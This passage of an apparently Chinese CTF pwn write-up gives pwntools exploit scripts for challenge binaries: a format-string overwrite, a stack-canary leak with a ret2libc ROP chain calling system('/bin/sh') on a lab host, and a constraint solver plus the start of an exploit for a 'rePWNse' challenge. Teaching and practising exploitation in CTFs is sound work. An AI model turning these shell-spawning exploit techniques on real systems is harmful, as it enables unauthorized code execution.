payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token number">0x804c00c</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

sa<span class="token punctuation">(</span><span class="token string">"Input what you want to talk: \n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
sl<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="little-canary-补"><a href="#little-canary-补" class="headerlink" title="little_canary[补]"></a>little_canary[补]</h2><p>第一次read 覆盖canary的低位00把canary打印出来，然后带上canary打ret2libc ，题目没有给libc，所以要用libcsearcher一下</p>
<p>ret2libc的话，构造一个 puts_plt(puts_got)的函数调用去打印一个libc的地址，算出libc_base后，libc中有binsh字符和system函数，就可以构造一个system(&#x2F;bin&#x2F;sh)的函数调用</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./little_canary'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"192.168.1.101"</span>
    port <span class="token operator">=</span> <span class="token number">64352</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
ru <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

r_leek_libc_64 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
r_leek_libc_32 <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>



payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">-</span> <span class="token number">8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>

sa<span class="token punctuation">(</span><span class="token string">"What's your name?\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

r<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
leak_canary <span class="token operator">=</span> <span class="token string">b'\x00'</span> <span class="token operator">+</span> r<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
success<span class="token punctuation">(</span>leak_canary<span class="token punctuation">)</span>


rdi <span class="token operator">=</span> <span class="token number">0x0000000000401343</span>
payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>leak_canary<span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span>
    rdi<span class="token punctuation">,</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
    elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>

<span class="token punctuation">]</span><span class="token punctuation">)</span>

sa<span class="token punctuation">(</span><span class="token string">b"I put a canary on my stack!\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>


leak_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>ru<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># libc_base = leak_addr - libc.sym['puts']</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>leak_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> leak_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>

success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"libc_base -> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>


ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span> 
<span class="token comment"># system = libc_base + libc.sym['system']</span>
<span class="token comment"># binsh = libc_base + next(libc.search(b'/bin/sh'))</span>

system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>
    <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x50</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">,</span>leak_canary<span class="token punctuation">,</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">,</span>
    ret<span class="token punctuation">,</span>rdi<span class="token punctuation">,</span>binsh<span class="token punctuation">,</span>system

<span class="token punctuation">]</span><span class="token punctuation">)</span>

sa<span class="token punctuation">(</span><span class="token string">"What's your name?\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
sa<span class="token punctuation">(</span><span class="token string">b"I put a canary on my stack!\n"</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h2 id="rePWNse-补"><a href="#rePWNse-补" class="headerlink" title="rePWNse[补]"></a>rePWNse[补]</h2><p>题目中有给 设置好的execve的模板，有pop rdi ret的gadget，但是没有binsh字符串，需要在makebinsh中构造一个binsh字符串。</p>
<p>这个makebinsh函数第一眼看觉得挺复杂的，但是细看会发现就是一个一元一次方程的约束求解，其中有一些 strncat((char *)s, &amp;src[v7[1]], 1uLL); 通过v7[i] 来做下标的表达式，是可以直接看出v7[i]的值。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">__int64 makebinsh<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  unsigned <span class="token builtin">int</span> v0<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v1<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v2<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v3<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v4<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v5<span class="token punctuation">;</span> <span class="token operator">//</span> eax
  <span class="token builtin">int</span> v7<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>0h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>70h<span class="token punctuation">]</span> BYREF
  char src<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>20h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>50h<span class="token punctuation">]</span> BYREF
  void <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>60h<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>10h<span class="token punctuation">]</span>
  <span class="token builtin">int</span> i<span class="token punctuation">;</span> <span class="token operator">//</span> <span class="token punctuation">[</span>rsp<span class="token operator">+</span>6Ch<span class="token punctuation">]</span> <span class="token punctuation">[</span>rbp<span class="token operator">-</span>4h<span class="token punctuation">]</span>

  strcpy<span class="token punctuation">(</span>src<span class="token punctuation">,</span> <span class="token string">"/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  s <span class="token operator">=</span> malloc<span class="token punctuation">(</span>8uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  memset<span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> 8uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> time<span class="token punctuation">(</span>0LL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  srand<span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  puts<span class="token punctuation">(</span><span class="token string">"Input seven single digits:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">6</span><span class="token punctuation">;</span> <span class="token operator">+</span><span class="token operator">+</span>i <span class="token punctuation">)</span>
    __isoc99_scanf<span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">*</span> v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">10</span> <span class="token operator">*</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> src<span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v1 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">53.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span>v1 <span class="token operator">/</span> <span class="token number">2147483647.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v2 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">53.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span>v2 <span class="token operator">/</span> <span class="token number">2147483647.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span>v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v3 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">53.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span>v3 <span class="token operator">/</span> <span class="token number">2147483647.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span>v7<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v4 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">53.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span>v4 <span class="token operator">/</span> <span class="token number">2147483647.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v7<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> v7<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">==</span> v7<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    v5 <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    strncat<span class="token punctuation">(</span><span class="token punctuation">(</span>char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">,</span> <span class="token operator">&amp;</span>src<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">53.0</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>double<span class="token punctuation">)</span>v5 <span class="token operator">/</span> <span class="token number">2147483647.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 1uLL<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  printf<span class="token punctuation">(</span><span class="token string">"Here's the string:%s\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>const char <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  printf<span class="token punctuation">(</span><span class="token string">"The address is:%p\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> 0LL<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>大约是这些约束，算了一下 得出的v7[]的结果是 1919810</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"</span>

result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token comment"># v7[3] * v7[1] == 10 * v7[4] + v7[5]</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># v7[5] == v7[6] + 1</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

<span class="token comment"># strncat((char *)s, &amp;src[v7[1]], 1uLL); v7[1] == 9</span>
<span class="token comment"># print(str.find('i'))</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token comment"># v7[1] == v7[3] v7[3] == 9</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span>

<span class="token comment"># strncat((char *)s, &amp;src[v7[6]], 1uLL); v7[6] == 0</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

<span class="token comment"># v7[0] == v7[2]</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span>

<span class="token comment"># v7[3] - v7[4] == v7[0]</span>
result <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> context<span class="token punctuation">.</span>binary <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./rePWNse'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libc

is_debug <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span><span class="token punctuation">(</span>is_debug<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> <span class="token string">"192.168.1.102"</span>
    port <span class="token operator">=</span> <span class="token number">49704</span>
    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span>port<span class="token punctuation">)</span>

<span class="token comment"># gdb.attach(p)</span>
g <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token comment"># send() sendline() sendafter() sendlineafter()</span>
s <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span> p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>

<span class="token comment"># recv() recvline() recvuntil()</span>
r <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
rl <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token punctuation">:</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
